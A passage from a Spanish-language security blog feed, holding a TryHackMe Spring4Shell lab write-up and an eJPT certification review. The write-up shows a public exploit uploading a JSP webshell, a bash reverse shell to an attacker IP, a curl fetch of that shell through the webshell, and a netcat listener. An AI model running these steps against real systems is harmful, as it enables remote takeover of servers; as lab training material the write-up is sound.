&lt;div class=&quot;language-zsh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ping &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 1 10.10.25.142
PING 10.10.25.142 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.25.142&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 56&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;84&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; bytes of data.
64 bytes from 10.10.25.142: &lt;span class=&quot;nv&quot;&gt;icmp_seq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1 &lt;span class=&quot;nv&quot;&gt;ttl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;63 &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;195 ms

&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; 10.10.25.142 ping statistics &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
1 packets transmitted, 1 received, 0% packet loss, &lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;0ms
rtt min/avg/max/mdev &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 194.521/194.521/194.521/0.000 ms
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Hacemos un &lt;strong&gt;escaneo de puertos&lt;/strong&gt; para detectar cuales de estos están abiertos para identificar vulnerabilidades en los mismos.&lt;/p&gt;

&lt;div class=&quot;language-zsh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 5000 10.10.25.142 &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; inicial
Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2022-04-08 09:28 &lt;span class=&quot;nt&quot;&gt;-05&lt;/span&gt;
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.25.142
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.31s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 52759 filtered tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;no-response&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, 12773 closed tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;reset&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Some closed ports may be reported as filtered due to &lt;span class=&quot;nt&quot;&gt;--defeat-rst-ratelimit&lt;/span&gt;
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Luego de identificar los puertos &lt;strong&gt;22&lt;/strong&gt;, &lt;strong&gt;80&lt;/strong&gt; y &lt;strong&gt;8080&lt;/strong&gt;, se procede a detectar servicios y versiones activos.&lt;/p&gt;

&lt;div class=&quot;language-zsh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p22&lt;/span&gt;,80,8080 &lt;span class=&quot;nt&quot;&gt;-sCV&lt;/span&gt; 10.10.25.142 &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; servicios
Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2022-04-08 09:35 &lt;span class=&quot;nt&quot;&gt;-05&lt;/span&gt;
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.25.142
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.27s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ssh-hostkey: 
|   3072 0c:92:70:6c:b6:df:1f:0b:45:ed:42:8d:b6:38:cc:67 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|   256 18:af:36:34:c9:2e:a4:6f:7a:27:31:e8:ef:6c:84:fb &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_  256 78:a6:1c:8a:16:5e:a6:29:29:a9:99:d0:66:9c:5e:06 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
80/tcp   open  http    nginx 1.20.2
|_http-title: Vulnerable
|_http-server-header: nginx/1.20.2
8080/tcp open  http    nginx 1.20.2
|_http-title: Index of /
| http-ls: Volume /
| SIZE  TIME               FILENAME
| 1260  03-Apr-2022 02:30  exploit.zip
|_
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: nginx/1.20.2
Service Info: OS: Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;En el navegador accedemos a la IP bajo el puerto 8080 y procedemos a descargar el archivo &lt;strong&gt;exploit.zip&lt;/strong&gt;.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/spring4shell/exploitzip.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Movemos el archivo a nuestra carpeta y procedemos a descomprimir el archivo con la utilidad &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unzip&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-zsh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;mv&lt;/span&gt; ~/Descargas/firefox/exploit.zip &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
❯ unzip exploit.zip
Archive:  exploit.zip
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;exploit.zip] exploit.py password: 
  inflating: exploit.py              
❯ &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;
 exploit.py   exploit.zip
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;La información del script descargado se puede obtener ingresando al GitHub de &lt;a href=&quot;https://github.com/BobTheShoplifter/Spring4Shell-POC&quot;&gt;BobTheShoplifter&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Procedemos a ver el funcionamiento del script.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;❯&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;python3&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;exploit&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;py&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;usage&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;exploit&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;py&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FILENAME&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PASSWORD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;d&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DIRECTORY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;exploit&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;py&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;the&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;following&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;arguments&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;are&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;required&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ahora ejecutamos el script con la URL victima (&lt;em&gt;FILENAME&lt;/em&gt;, &lt;em&gt;PASSWORD&lt;/em&gt; y &lt;em&gt;DIRECTORY&lt;/em&gt; son opcionales).&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;❯&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;python3&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;exploit&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;py&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;//&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;10.10.25.142&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;Shell&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Uploaded&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Successfully&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;!&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;Your&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shell&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;can&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;be&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;found&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;at&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;//&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;10.10.25.142&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tomcatwar&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;jsp&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pwd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;thm&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;whoami&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Como indica la salida del script, la webshell ha sido cargada en el servidor con éxito, por lo tanto, ya tenemos la &lt;strong&gt;capacidad&lt;/strong&gt; de ejecutar comandos de manera remota.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/spring4shell/vulnerable.png&quot; /&gt;
&lt;/p&gt;
&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/spring4shell/intrusion.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Ahora vamos a subir una &lt;strong&gt;reverseshell&lt;/strong&gt; para ganar acceso a la maquina!&lt;/p&gt;

&lt;p&gt;Crearemos un archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;shell.sh&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-zsh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nano shell.sh

&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
bash &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;amp; /dev/tcp/10.9.3.40/1234 0&amp;gt;&amp;amp;1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Luego de crear el archivo, vamos a cargar este al servidor vulnerable, por medio de un servidor local de python.&lt;/p&gt;

&lt;div class=&quot;language-zsh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ python3 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; http.server
Serving HTTP on 0.0.0.0 port 8000 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;http://0.0.0.0:8000/&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; ...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ejecutaremos en el navegador la siguiente &lt;strong&gt;URL&lt;/strong&gt; para cargar nuestra shell en la carpeta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/tmp&lt;/code&gt; de la víctima.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;http://10.10.25.142/tomcatwar.jsp?pwd=thm&amp;amp;cmd=curl http://10.9.3.40:8000/shell.sh -o /tmp/shell.sh&lt;/li&gt;
&lt;/ul&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/spring4shell/shell.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Nuestra shell se encuentra ahora en el servidor vulnerable!&lt;/p&gt;

&lt;p&gt;Vamos a ponernos en escucha con la utilidad netcat, en esta ocasión bajo el puerto &lt;strong&gt;1234&lt;/strong&gt;.&lt;/p&gt;

&lt;div class=&quot;language-zsh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nc &lt;span class=&quot;nt&quot;&gt;-lvnp&lt;/span&gt; 1234
listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 1234 ...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Procedemos a ejecutar el archivo en el servidor víctima.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;http://10.10.25.142/tomcatwar.jsp?pwd=thm&amp;amp;cmd=bash /tmp/shell.sh&lt;/li&gt;
&lt;/ul&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/spring4shell/admin.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Como se puede ver en la imagen anterior, hemos logrado obtener una &lt;strong&gt;shell&lt;/strong&gt; en la maquina!&lt;/p&gt;

&lt;p&gt;Ahora vamos a realizar un &lt;em&gt;tratamiento&lt;/em&gt; de la TTY, para lograr una mayor fluidez en la consola, para ello vamos a ejecutar los siguientes comandos iniciando en la maquina víctima.&lt;/p&gt;

&lt;div class=&quot;language-zsh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;script /dev/null &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; bash
^Z
&lt;span class=&quot;nb&quot;&gt;stty &lt;/span&gt;raw &lt;span class=&quot;nt&quot;&gt;-echo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;fg
&lt;/span&gt;reset
xterm
&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;XTERM&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;xterm
&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;SHELL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;bash
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Luego de que logramos una terminal fluida, vamos a buscar la &lt;strong&gt;flag&lt;/strong&gt; y leerla!&lt;/p&gt;

&lt;p&gt;En esta ocasión solo tenemos una &lt;strong&gt;flag&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Solo mostraré los primeros 10 dígitos de está.&lt;/p&gt;

&lt;div class=&quot;language-zsh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@spring4shell:/# &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; /root
flag.txt
root@spring4shell:/# &lt;span class=&quot;nb&quot;&gt;head&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 10 /root/flag.txt &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo
&lt;/span&gt;THM&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;NjAyNz
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;¡Ya está!&lt;/strong&gt;&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/spring4shell/finish.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Por último, les recomiendo &lt;strong&gt;actualizar&lt;/strong&gt; sus frameworks de Spring o generar controles pertinentes para que sus sistemas no sean vulnerables!&lt;/p&gt;

&lt;p&gt;&lt;em&gt;¡Que tengan un buen día en el planeta donde se encuentren!&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Nos vemos en otro bit.&lt;/strong&gt;&lt;/p&gt;</content><author><name>Bast1ant1c</name></author><category term="Writeup" /><category term="Spring4shell" /><summary type="html">Vamos a resolver la maquina Spring4SHell de TryHackMe. ¡Let's hack!</summary></entry><entry><title type="html">eJPT Review</title><link href="http://localhost:4000/ejpt/" rel="alternate" type="text/html" title="eJPT Review" /><published>2022-03-30T00:00:00-05:00</published><updated>2022-03-30T00:00:00-05:00</updated><id>http://localhost:4000/ejpt</id><content type="html" xml:base="http://localhost:4000/ejpt/">&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/ejpt/ejpt.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;¡Hola!
Vengo a contar mi experiencia de como logré adquirir el certificado de &lt;em&gt;“eLearnSecurity Junior Penetration Tester”&lt;/em&gt; &lt;strong&gt;(eJPT)&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;He dividido en &lt;strong&gt;6&lt;/strong&gt; secciones lo que pude identificar, para cada una de las fases de mi preparación antes, durante y después del &lt;strong&gt;examen&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Espero le sirva a la persona que está leyendo, así como a mí me sirvieron algunos &lt;strong&gt;reviews&lt;/strong&gt; que leí en su momento.&lt;/p&gt;

&lt;p&gt;Seré breve en todas las secciones para no saturarlos de información.&lt;/p&gt;

&lt;h2 id=&quot;pre-requisitos&quot;&gt;PRE-REQUISITOS&lt;/h2&gt;

&lt;p&gt;Realmente aconsejo hacer un plan de estudio, llévalo a tu ritmo, prepárate con calma, disfruta lo que haces, porque estas aprendiendo para tu futuro, no solo para un examen.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Organiza tu &lt;em&gt;tiempo&lt;/em&gt; y mantente constante, será de gran ayuda!&lt;/li&gt;
  &lt;li&gt;Lleva unos &lt;em&gt;apuntes&lt;/em&gt;, ya sea en hojas o en un PC.&lt;/li&gt;
  &lt;li&gt;Se proactivo, investiga, lee, mantente &lt;em&gt;actualizado&lt;/em&gt;.&lt;/li&gt;
  &lt;li&gt;Planifica una &lt;em&gt;meta&lt;/em&gt;, una fecha o una ocasión especial para hacer el examen.&lt;/li&gt;
  &lt;li&gt;Si puedes &lt;em&gt;explicarle&lt;/em&gt; a alguien lo que has aprendido, te ayudara bastante a entender un poco más.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;preparación&quot;&gt;PREPARACIÓN&lt;/h2&gt;

&lt;p&gt;Considero que para la eJPT tienes una cantidad de información de &lt;strong&gt;calidad&lt;/strong&gt; a la mano, apóyate en tus colegas, grupos, internet, libros si es necesario, como mejor te sientas para lograr entender lo que estas aprendiendo, no hay un camino correcto, &lt;em&gt;todos llegamos a un mismo destino&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;Dejaré los temas que son evaluados en la eJPT:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;TCP/IP.&lt;/li&gt;
  &lt;li&gt;Routing/Pivoting.&lt;/li&gt;
  &lt;li&gt;Metodología de pentesting.&lt;/li&gt;
  &lt;li&gt;Escaneo/Reconocimiento de dispositivos.&lt;/li&gt;
  &lt;li&gt;Protocolos.&lt;/li&gt;
  &lt;li&gt;Analisis web básico.&lt;/li&gt;
  &lt;li&gt;Explotación de vulnerabilidades.&lt;/li&gt;
  &lt;li&gt;Uso de hacktools.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;el-curso&quot;&gt;EL CURSO&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;INE&lt;/strong&gt; es una plataforma de estudio que te ayudará a prepararte para el examen, el &lt;em&gt;curso PTS (Penetration Tester Student)&lt;/em&gt; no tiene costo y consolida todos los temas que encuentras en la certificación, solo debes inscribirte y eso es todo.&lt;/p&gt;

&lt;p&gt;Personalmente el curso me parece muy completo, se divide en &lt;strong&gt;4&lt;/strong&gt; módulos y tienes laboratorios, diapositivas, videos y ahora están implementando evaluaciones que ayudan a reforzar conocimientos.&lt;/p&gt;

&lt;p&gt;Aquí van los &lt;em&gt;módulos&lt;/em&gt; del curso:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Prerequisites: Conceptos básicos.&lt;/li&gt;
  &lt;li&gt;Programming: Términos de programación.&lt;/li&gt;
  &lt;li&gt;Basics: Técnicas de pentesting.&lt;/li&gt;
  &lt;li&gt;Exam Preparation: Laboratorios.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;el-examen&quot;&gt;EL EXAMEN&lt;/h2&gt;

&lt;p&gt;Tienes &lt;strong&gt;3&lt;/strong&gt; días para realizar el examen y necesitas de una VPN en tu máquina, procura tener buen internet, conectado por cable si es posible, compra algo de comer, algo de tomar, pon música, despliega todas tus notas, duerme bien el día anterior y escoge la mejor hora y fecha para realizar la certificación, si estas tranquilo, todo va a salir bien, no te presiones, tienes bastante tiempo, ten en cuenta que no es un CTF, enfócate en las preguntas y no solo en vulnerar todos los sistemas hasta que seas un usuario administrador.&lt;/p&gt;

&lt;p&gt;Recuerda que estás haciendo un pentesting, debes contestar unos requerimientos que te dan en cada una de las &lt;strong&gt;20&lt;/strong&gt; preguntas del examen, recuerda los conceptos de &lt;em&gt;routing&lt;/em&gt; porque es muy importante tenerlos claros y, por último, sácale el mayor provecho, aprende mucho, &lt;em&gt;diviértete&lt;/em&gt; y comparte tu conocimiento, ¡alguien más te lo agradecerá!&lt;/p&gt;

&lt;p&gt;Ítems claves de la certificación:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Carta de presentación: Lee con atención todos los requerimientos.&lt;/li&gt;
  &lt;li&gt;Duración: 3 días.&lt;/li&gt;
  &lt;li&gt;Preguntas: 20 (selección múltiple).&lt;/li&gt;
  &lt;li&gt;Enfócate en las preguntas.&lt;/li&gt;
  &lt;li&gt;Estudia routing / pivoting&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;extras&quot;&gt;EXTRAS&lt;/h2&gt;

&lt;p&gt;Te dejare algunos &lt;em&gt;tips&lt;/em&gt; y &lt;em&gt;algunos&lt;/em&gt; links que fueron de ayuda para mí, estoy seguro de que van a ayudarte en este proceso:&lt;/p&gt;

&lt;p&gt;Tips:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Practica routing (comandos, laboratorios, conceptos, etc.).&lt;/li&gt;
  &lt;li&gt;Realiza las black box del curso PTS.&lt;/li&gt;
  &lt;li&gt;El reconocimiento es la fase más importante de un pentesting&lt;/li&gt;
  &lt;li&gt;Mira los writeups de las maquinas Blue en Hack The Box y/o Try Hack Me.&lt;/li&gt;
  &lt;li&gt;Estudia SQLi y XSS&lt;/li&gt;
  &lt;li&gt;Repasa herramientas de ataques de fuerza bruta&lt;/li&gt;
  &lt;li&gt;Descansa un poco la mente&lt;/li&gt;
  &lt;li&gt;Tómalo con calma&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Links:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://my.ine.com/CyberSecurity/learning-paths/a223968e-3a74-45ed-884d-2d16760b8bbd/penetration-testing-student&quot;&gt;Curso PTS&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.notion.so/course-PTSv4-22ad4ca2ce3e4fe0a5e369217b41c9b3&quot;&gt;Curso Extraoficial&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.marabellisec.com/&quot;&gt;Cheat sheet 1&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://githubmemory.com/repo/tejasanerao/eJPT-Cheatsheet&quot;&gt;Cheat sheet 2&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://kentosec.com/2019/08/04/how-to-pass-the-ejpt/&quot;&gt;Cheat sheet 3&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/search?q=ejpt&quot;&gt;GitHub&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://docs.google.com/spreadsheets/d/1dzvaGlT_0xnT-PGO27Z_4prHgA8PHIpErmoWdlUrSoA/edit#gid=0&quot;&gt;Planning de estudio con S4vitar&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;conclusión&quot;&gt;CONCLUSIÓN&lt;/h2&gt;

&lt;p&gt;La verdad me gusto bastante la certificación, aprendí mucho de metodologías, buscar diferentes maneras de explotar vulnerabilidades, entre otras.&lt;/p&gt;

&lt;p&gt;El examen considero que tiene una gran cantidad de tiempo disponible para poder aprovecharlo al máximo, con el curso PTS tienes más que suficiente, tendrás todos los conceptos para lograr pasar.&lt;/p&gt;

&lt;p&gt;Yo recomiendo hacer los laboratorios, estudiar y tomar notas de todo, ponerlo en práctica y si es posible explicarles a tus compañeros para que consolides ese conocimiento adquirido.&lt;/p&gt;

&lt;p&gt;Los links de ayuda dan una gran oportunidad de tener guías a la mano para no dejar escapar ningún detalle.&lt;/p&gt;
